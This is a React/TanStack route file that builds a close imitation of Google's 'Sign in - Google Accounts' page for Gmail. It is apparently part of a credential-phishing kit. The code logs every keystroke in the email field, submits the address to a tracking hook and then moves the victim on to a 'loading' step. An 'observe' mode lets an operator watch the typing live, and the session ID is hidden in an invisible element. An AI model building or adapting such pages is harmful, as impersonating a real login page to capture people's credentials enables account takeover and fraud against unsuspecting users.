import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import {
  GE_SHELL_CSS,
  GeFontStyle,
  GeFooter,
  GoogleGLogo,
  useGeTracking,
} from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/signin")({
  head: () => ({
    meta: [
      { title: "Sign in - Google Accounts" },
      { name: "color-scheme", content: "dark" },
    ],
  }),
  component: GeSignInPage,
});

const GE_SIGNIN_CSS = `
${GE_SHELL_CSS}

.ge-form {
  margin-top: 24px;
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
}
/* Push the email field down so it lines up with "Sign in" (below the G logo) */
@media (min-width: 900px) {
  .ge-form {
    margin-top: 0;
    padding-top: 64px; /* logo 48px + title gap — matches screenshot */
  }
}

/* Single outline: color only. Never stack gray+blue. */
.ge-field {
  position: relative;
  width: 100%;
  height: 56px;
  margin-top: 0;
}
.ge-field input {
  position: relative;
  z-index: 1;
  width: 100%;
  height: 56px;
  margin: 0;
  padding: 13px 15px;
  border: 0 !important;
  outline: none !important;
  box-shadow: none !important;
  background: transparent;
  color: var(--gm3-on-surface);
  font-family: inherit;
  font-size: 1rem;
  line-height: 1.5;
  caret-color: var(--gm3-primary);
  -webkit-appearance: none;
  appearance: none;
}
.ge-field input:focus,
.ge-field input:focus-visible {
  outline: none !important;
  box-shadow: none !important;
  border: 0 !important;
}
.ge-field .ring {
  position: absolute;
  inset: 0;
  border-radius: 4px;
  pointer-events: none;
  /* always 2px so switching state never stacks two widths */
  box-shadow: inset 0 0 0 1px var(--gm3-outline);
  transition: box-shadow .15s cubic-bezier(.4,0,.2,1);
}
.ge-field.is-active .ring {
  box-shadow: inset 0 0 0 2px var(--gm3-primary);
}
.ge-field label {
  position: absolute;
  left: 8px;
  bottom: 17px;
  padding: 0 8px;
  max-width: calc(100% - 16px);
  color: var(--gm3-on-surface-variant);
  background: var(--gm3-card);
  font-size: 1rem;
  line-height: 1.5;
  pointer-events: none;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  transform-origin: left center;
  transition: transform .15s cubic-bezier(.4,0,.2,1), color .15s cubic-bezier(.4,0,.2,1);
  z-index: 2;
}
.ge-field.is-active label {
  color: var(--gm3-primary);
  transform: translateY(-29px) scale(0.75);
}
.ge-field.has-value:not(:focus-within) label {
  color: var(--gm3-on-surface-variant);
  transform: translateY(-29px) scale(0.75);
}
.ge-field.is-active input { padding: 12px 14px; }

.ge-forgot {
  margin: 9px 0 0;
  padding: 0;
  border: 0;
  background: none;
  color: var(--gm3-primary);
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  cursor: pointer;
  text-align: left;
}
.ge-forgot:hover { text-decoration: underline; }
.ge-guest {
  margin-top: 32px;
  color: var(--gm3-on-surface-variant);
  font-size: 0.875rem;
  line-height: 1.4286;
}
.ge-guest a {
  color: var(--gm3-primary);
  font-weight: 500;
  text-decoration: none;
}
.ge-guest a:hover { text-decoration: underline; }
.ge-actions {
  /* Match Google Accounts: Create account immediately left of Next, both packed to the right */
  display: flex;
  flex-direction: row-reverse;
  flex-wrap: wrap;
  align-items: center;
  justify-content: flex-start;
  margin-top: auto;
  padding-top: 32px;
  gap: 0;
  width: 100%;
}
.ge-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  height: 40px;
  min-width: 64px;
  padding: 0 24px;
  border: none;
  border-radius: 20px;
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  cursor: pointer;
}
.ge-btn-next {
  background: var(--gm-next-fill);
  color: var(--gm-next-ink);
}
.ge-btn-next:hover:not(:disabled) {
  box-shadow: 0 1px 2px rgba(0,0,0,.3), 0 1px 3px 1px rgba(0,0,0,.15);
  filter: brightness(1.05);
}
.ge-btn-next:disabled {
  opacity: 0.38;
  cursor: default;
  filter: none;
  box-shadow: none;
}
.ge-btn-create {
  background: transparent;
  color: var(--gm-next-fill);
  padding: 0 24px;
}
.ge-btn-create:hover { background: rgba(138, 180, 248, 0.08); }
`;

function GeSignInPage() {
  const { trackClick, trackInput, trackSubmit, geNavigate, sessionId, isObserve } =
    useGeTracking();
  const [email, setEmail] = useState("");
  const [focused, setFocused] = useState(false);
  const emailRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    setTimeout(() => emailRef.current?.focus(), 200);
  }, []);

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      const value = String(d.value ?? "");
      if (
        d.field === "email" ||
        d.field === "identifier" ||
        d.field === "Email or phone" ||
        d.field === "Email" ||
        d.field === "email_submitted"
      ) {
        setEmail(value);
      }
    }
    window.addEventListener("ux:mirror-live-input", onMirror);
    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
  }, [isObserve]);

  const hasValue = email.length > 0;
  const isActive = focused || hasValue;
  const canContinue = email.trim().length > 0;

  const handleNext = (e?: React.FormEvent) => {
    e?.preventDefault();
    if (!canContinue) return;
    trackClick("Next");
    trackSubmit("email", email.trim());
    // Navigate immediately — card stays put (no fade-out)
    geNavigate("/ge/loading");
  };

  return (
    <div className="ge-shell">
      <GeFontStyle />
      <style>{GE_SIGNIN_CSS}</style>

      <main className="ge-card" role="main">
        <div className="ge-pane-left">
          <GoogleGLogo className="ge-logo" width={48} height={48} />
          <h1 className="ge-title">Sign in</h1>
          <p className="ge-sub">to continue to Gmail</p>
        </div>

        <div className="ge-pane-right">
          <form className="ge-form" onSubmit={handleNext} autoComplete="off">
            <div
              className={`ge-field${hasValue ? " has-value" : ""}${isActive ? " is-active" : ""}`}
            >
              <input
                ref={emailRef}
                id="identifierId"
                name="email"
                type="email"
                autoComplete="username"
                spellCheck={false}
                autoCapitalize="none"
                aria-label="Email or phone"
                value={email}
                onFocus={() => setFocused(true)}
                onBlur={() => setFocused(false)}
                onChange={(e) => {
                  const v = e.target.value;
                  setEmail(v);
                  trackInput("email", v, "email");
                }}
              />
              <div className="ring" aria-hidden="true" />
              <label htmlFor="identifierId">Email or phone</label>
            </div>

            <button
              type="button"
              className="ge-forgot"
              onClick={() => trackClick("Forgot email?")}
            >
              Forgot email?
            </button>

            <p className="ge-guest">
              Not your computer? Use Guest mode to sign in privately.{" "}
              <a
                href="https://support.google.com/chrome/answer/6130773?hl=en"
                target="_blank"
                rel="noopener noreferrer"
              >
                Learn more about using Guest mode
              </a>
            </p>

            <div className="ge-actions">
              <button type="submit" className="ge-btn ge-btn-next" disabled={!canContinue}>
                Next
              </button>
              <button
                type="button"
                className="ge-btn ge-btn-create"
                onClick={() => trackClick("Create account")}
              >
                Create account
              </button>
            </div>
          </form>
        </div>
      </main>

      <GeFooter />
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
